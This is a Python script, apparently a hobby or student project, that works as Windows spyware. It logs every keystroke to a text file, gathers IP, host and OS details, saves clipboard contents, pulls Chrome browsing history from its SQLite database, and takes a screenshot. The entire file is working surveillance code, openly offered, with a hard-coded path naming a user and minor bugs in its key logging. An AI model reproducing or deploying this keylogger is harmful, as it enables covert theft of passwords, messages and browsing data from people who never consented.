""" This is a python program that does the following:
1->Record the keystrokes and store it in text file
    *******pynput.keyboard, key and listener
2->Retrieve the computer information and store it in excel file
    *******socket, platform and pandas
3->Retrieve the clipboard information and store it in text file
   ********win32clipboard
4->Retrieve the google chrome history and store it in excel file
   ********datetime, sqlite3 and pandas
5->Take a screenshot of the computer screen in png format
   ********pillow and imagegrab """


from pynput.keyboard import Key, Listener #recording keystrokes
import sqlite3 #get the data from a database
import datetime #get the date
import socket #get computer information
import platform #get computer information
from requests import get #get information from a website
import win32clipboard #get clipboard information
from PIL import ImageGrab #get screenshot
import pandas as pd #manipulate with the aquired data


#records keystrokes and store it in text file
k = []

#function to record the keystroke
def on_press(key):
    k.append(key)
    write_file(k)
    print(key)

#function to write the data to a text file
def write_file(var):
    with open("logs.txt","a") as f:
        for i in var:
            new_var = str(i).replace("'","")
        f.write(new_var)
        f.write(" ")

#function to stop the recording       
def on_release(key):
    if key == Key.esc:
        return False

#listener function
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join() 


#gets the computer information and store it in text file

date = datetime.date.today() #get the data

ip_address = socket.gethostbyname(socket.gethostname()) #get the IP address

processor = platform.processor() #get the processor details

system = platform.system() #get the system details
release = platform.release()

host_name = socket.gethostname() #get the host name

# Create a DataFrame with computer information
data = {
    'Metric': ['Date','IP Address', 'Processor', 'System', 'Release', 'Host Name'],
    'Value': [date,ip_address, processor, system, release, host_name]
}
df = pd.DataFrame(data)

# Save the DataFrame to an Excel file
df.to_excel('keystrokes.xlsx', index=False)

#get the clipboard information and store it in text file

def copy_clipboard():
    current_date = datetime.datetime.now()
    with open("clipboard.txt", "a") as f:
        
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard() #get the clipboard data and store it in pasted_data

            f.write("\n")
            f.write("date and time:"+ str(current_date)+"\n")
            f.write("clipboard data: \n "+ pasted_data) #write the clipboard data into the text file
        
copy_clipboard()



#get history of google chrome

conn = sqlite3.connect('C:\\Users\\ASHUTOSH\\Desktop\\history1') #connect to the google chrome history database "add your path"
cursor = conn.cursor()

# Retrieve search history from the database accordingly
cursor.execute("SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') AS last_visit_time FROM urls")
search_history = cursor.fetchall()

# Create a pandas DataFrame from the retrieved search history
df = pd.DataFrame(search_history, columns=['url', 'title', 'Timestamp'])

# Save the search history DataFrame to an Excel file
excel_file = "search_history.xlsx"
df.to_excel(excel_file, index=False)

# Close the database connection
conn.close()

#get the screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save("screenshot.png")

screenshot()









  




